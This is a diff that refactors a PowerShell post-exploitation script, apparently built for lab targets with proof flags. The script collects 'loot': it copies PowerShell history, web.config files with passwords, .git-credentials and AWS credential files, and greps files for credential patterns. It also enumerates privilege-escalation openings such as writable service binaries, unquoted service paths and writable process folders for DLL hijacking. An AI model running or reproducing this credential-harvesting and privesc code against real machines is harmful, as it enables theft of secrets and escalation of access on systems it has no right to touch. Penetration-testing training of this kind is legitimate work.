@@ -39,7 +39,12 @@ function Write-Phase   { param($msg) Write-Host "`n[$(Get-Date -f HH:mm:ss)] [PH
 # PROGRESS TRACKING
 #==============================================================================
 function Write-ProgressLog {
-    param($Dir, $Status, $PhaseName, $Detail)
+    param(
+        [string]$Dir,
+        [string]$Status,
+        [string]$PhaseName,
+        [string]$Detail
+    )
     $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "$ts | $Status | $PhaseName | $Detail" | Out-File -Append -Encoding UTF8 "$Dir\progress.log"
 }
@@ -109,7 +114,7 @@ if ($Phase) { Write-Info "Single phase mode: $Phase" }
 #==============================================================================
 function Invoke-PhaseProof {
     Write-Phase "1 — PROOF FLAGS"
-    Write-ProgressLog $LootDir "START" "proof" "Searching for proof flags"
+    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "proof" -Detail "Searching for proof flags"
 
     $ProofDir = Join-Path $LootDir "proof"
     $SearchPaths = @(
@@ -128,8 +133,8 @@ function Invoke-PhaseProof {
     $FoundAny = $false
     foreach ($pattern in $SearchPaths) {
         try {
-            $matches = Get-Item -Path $pattern -ErrorAction SilentlyContinue
-            foreach ($f in $matches) {
+            $matchResult = Get-Item -Path $pattern -ErrorAction SilentlyContinue
+            foreach ($f in $matchResult) {
                 Write-Success "Found: $($f.FullName)"
                 $content = Get-Content $f.FullName -ErrorAction SilentlyContinue
                 Write-Host ""
@@ -143,7 +148,7 @@ function Invoke-PhaseProof {
                 $FoundAny = $true
             }
         } catch {
-            # pattern may not match anything
+            $null = $_  # pattern may not match anything — expected
         }
     }
 
@@ -164,7 +169,7 @@ function Invoke-PhaseProof {
         }
     }
 
-    Write-ProgressLog $LootDir "DONE" "proof" "Proof flag search complete"
+    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "proof" -Detail "Proof flag search complete"
 }
 
 #==============================================================================
@@ -172,7 +177,7 @@ function Invoke-PhaseProof {
 #==============================================================================
 function Invoke-PhaseSystem {
     Write-Phase "2 — SYSTEM INFO"
-    Write-ProgressLog $LootDir "START" "system" "Collecting system information"
+    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "system" -Detail "Collecting system information"
 
     $SDir = Join-Path $LootDir "system"
 
@@ -239,8 +244,8 @@ function Invoke-PhaseSystem {
             try {
                 $sw += Get-ItemProperty $rp -ErrorAction SilentlyContinue |
                     Where-Object { $_.DisplayName } |
-                    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
-            } catch { }
+                    Select-Object -Property DisplayName, DisplayVersion, Publisher, InstallDate
+            } catch { $null = $_ }
         }
         $sw | Sort-Object DisplayName | Format-Table -AutoSize |
             Out-File -Encoding UTF8 "$SDir\installed_software.txt"
@@ -310,7 +315,7 @@ function Invoke-PhaseSystem {
     }
 
     Write-Success "System info complete -> $SDir\"
-    Write-ProgressLog $LootDir "DONE" "system" "System info collected"
+    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "system" -Detail "System info collected"
 }
 
 #==============================================================================
@@ -318,7 +323,7 @@ function Invoke-PhaseSystem {
 #==============================================================================
 function Invoke-PhaseCreds {
     Write-Phase "3 — CREDENTIALS"
-    Write-ProgressLog $LootDir "START" "creds" "Collecting credentials"
+    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "creds" -Detail "Collecting credentials"
 
     $CDir = Join-Path $LootDir "creds"
 
@@ -362,14 +367,14 @@ function Invoke-PhaseCreds {
     $histCount = 0
     foreach ($hp in $histPaths) {
         try {
-            $matches = Get-Item -Path $hp -ErrorAction SilentlyContinue
-            foreach ($hf in $matches) {
+            $matchResult = Get-Item -Path $hp -ErrorAction SilentlyContinue
+            foreach ($hf in $matchResult) {
                 $safeName = $hf.FullName -replace "[:\\]", "_"
                 Copy-Item $hf.FullName "$CDir\pshistory_$safeName.txt" -ErrorAction SilentlyContinue
                 Write-Success "PSReadLine history: $($hf.FullName)"
                 $histCount++
             }
-        } catch { }
+        } catch { $null = $_ }
     }
     if ($histCount -eq 0) { Write-Info "No PSReadLine history files found" }
 
@@ -401,7 +406,7 @@ function Invoke-PhaseCreds {
                     Copy-Item $wc.FullName "$CDir\webconfig_$safeName.xml" -ErrorAction SilentlyContinue
                     Write-Success "Web.config with creds: $($wc.FullName)"
                 }
-            } catch { }
+            } catch { $null = $_ }
         }
     } catch {
         Write-Warn "Web.config search failed: $_"
@@ -421,7 +426,7 @@ function Invoke-PhaseCreds {
                 Select-Object -First 50 |
                 ForEach-Object { $_.Path }
             $credFiles.AddRange([string[]]($results | Select-Object -Unique))
-        } catch { }
+        } catch { $null = $_ }
     }
     $credFiles | Select-Object -Unique | Out-File -Encoding UTF8 "$CDir\files_with_cred_patterns.txt"
     if ($credFiles.Count -gt 0) {
@@ -436,12 +441,12 @@ function Invoke-PhaseCreds {
     )
     foreach ($gcp in $gitCredPaths) {
         try {
-            $matches = Get-Item -Path $gcp -ErrorAction SilentlyContinue
-            foreach ($gf in $matches) {
+            $matchResult = Get-Item -Path $gcp -ErrorAction SilentlyContinue
+            foreach ($gf in $matchResult) {
                 Copy-Item $gf.FullName "$CDir\git_credentials_$(Split-Path $gf -Leaf).txt" -ErrorAction SilentlyContinue
                 Write-Success ".git-credentials: $($gf.FullName)"
             }
-        } catch { }
+        } catch { $null = $_ }
     }
 
     # AWS credentials
@@ -452,12 +457,12 @@ function Invoke-PhaseCreds {
     )
     foreach ($ap in $awsPaths) {
         try {
-            $matches = Get-Item -Path $ap -ErrorAction SilentlyContinue
-            foreach ($af in $matches) {
+            $matchResult = Get-Item -Path $ap -ErrorAction SilentlyContinue
+            foreach ($af in $matchResult) {
                 Copy-Item $af.FullName "$CDir\aws_credentials.txt" -ErrorAction SilentlyContinue
                 Write-Success "AWS credentials: $($af.FullName)"
             }
-        } catch { }
+        } catch { $null = $_ }
     }
 
     # Azure credentials
@@ -567,7 +572,7 @@ function Invoke-PhaseCreds {
     }
 
     Write-Success "Credentials collection complete -> $CDir\"
-    Write-ProgressLog $LootDir "DONE" "creds" "Credentials collected"
+    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "creds" -Detail "Credentials collected"
 }
 
 #==============================================================================
@@ -575,7 +580,7 @@ function Invoke-PhaseCreds {
 #==============================================================================
 function Invoke-PhaseNetwork {
     Write-Phase "4 — NETWORK"
-    Write-ProgressLog $LootDir "START" "network" "Collecting network information"
+    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "network" -Detail "Collecting network information"
 
     $NDir = Join-Path $LootDir "network"
 
@@ -709,7 +714,7 @@ function Invoke-PhaseNetwork {
     }
 
     Write-Success "Network info complete -> $NDir\"
-    Write-ProgressLog $LootDir "DONE" "network" "Network info collected"
+    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "network" -Detail "Network info collected"
 }
 
 #==============================================================================
@@ -717,7 +722,7 @@ function Invoke-PhaseNetwork {
 #==============================================================================
 function Invoke-PhaseFiles {
     Write-Phase "5 — INTERESTING FILES (PRIVESC VECTORS)"
-    Write-ProgressLog $LootDir "START" "files" "Searching for privesc vectors"
+    Write-ProgressLog -Dir $LootDir -Status "START" -PhaseName "files" -Detail "Searching for privesc vectors"
 
     $FDir = Join-Path $LootDir "files"
 
@@ -761,7 +766,7 @@ function Invoke-PhaseFiles {
                 $writablePaths.Add("WRITABLE: $pd")
                 Write-Warn "PATH dir is writable: $pd"
             } catch {
-                # not writable — expected
+                $null = $_  # not writable — expected
             }
         }
         if ($writablePaths.Count -eq 0) {
@@ -775,7 +780,7 @@ function Invoke-PhaseFiles {
     # Writable service binary paths
     Write-Info "Checking for writable service binary paths..."
     try {
-        $services = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
+        $services = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
             Where-Object { $_.PathName -and $_.State -eq "Running" }
         $writableServices = [System.Collections.Generic.List[string]]::new()
         foreach ($svc in $services) {
@@ -793,7 +798,7 @@ function Invoke-PhaseFiles {
                     $writableServices.Add("WRITABLE SERVICE BINARY: $binPath ($($svc.Name))")
                     Write-Warn "Writable service binary: $binPath"
                 }
-            } catch { }
+            } catch { $null = $_ }
         }
         if ($writableServices.Count -eq 0) {
             $writableServices.Add("No writable service binaries found")
@@ -806,7 +811,7 @@ function Invoke-PhaseFiles {
     # Unquoted service paths
     Write-Info "Checking for unquoted service paths..."
     try {
-        $unquoted = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
+        $unquoted = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
             Where-Object {
                 $_.PathName -and
                 $_.PathName -notmatch '^"' -and
@@ -840,7 +845,7 @@ function Invoke-PhaseFiles {
                 foreach ($item in $items) {
                     $recentFiles.Add("$($item.LastWriteTime.ToString('yyyy-MM-dd HH:mm')) $($item.FullName)")
                 }
-            } catch { }
+            } catch { $null = $_ }
         }
         $recentFiles | Out-File -Encoding UTF8 "$FDir\recently_modified.txt"
         Write-Success "Recently modified files: $($recentFiles.Count)"
@@ -862,7 +867,7 @@ function Invoke-PhaseFiles {
                 foreach ($item in $items) {
                     $backupFiles.Add($item.FullName)
                 }
-            } catch { }
+            } catch { $null = $_ }
         }
         $backupFiles | Out-File -Encoding UTF8 "$FDir\backup_db_files.txt"
         if ($backupFiles.Count -gt 0) {
@@ -885,7 +890,7 @@ function Invoke-PhaseFiles {
                 foreach ($item in $items) {
                     $scriptFiles.Add($item.FullName)
                 }
-            } catch { }
+            } catch { $null = $_ }
         }
         $scriptFiles | Out-File -Encoding UTF8 "$FDir\scripts.txt"
         if ($scriptFiles.Count -gt 0) {
@@ -911,7 +916,7 @@ function Invoke-PhaseFiles {
                 Remove-Item $testFile -ErrorAction SilentlyContinue
                 $dllHijack.Add("WRITABLE: $procDir (process: $($proc.Name))")
                 Write-Warn "Writable process dir (DLL hijack): $procDir"
-            } catch { }
+            } catch { $null = $_ }
         }
         if ($dllHijack.Count -eq 0) {
             $dllHijack.Add("No writable process directories found")
@@ -922,7 +927,7 @@ function Invoke-PhaseFiles {
     }
 
     Write-Success "File enumeration complete -> $FDir\"
-    Write-ProgressLog $LootDir "DONE" "files" "Privesc vector enumeration complete"
+    Write-ProgressLog -Dir $LootDir -Status "DONE" -PhaseName "files" -Detail "Privesc vector enumeration complete"
 }
 
 #==============================================================================
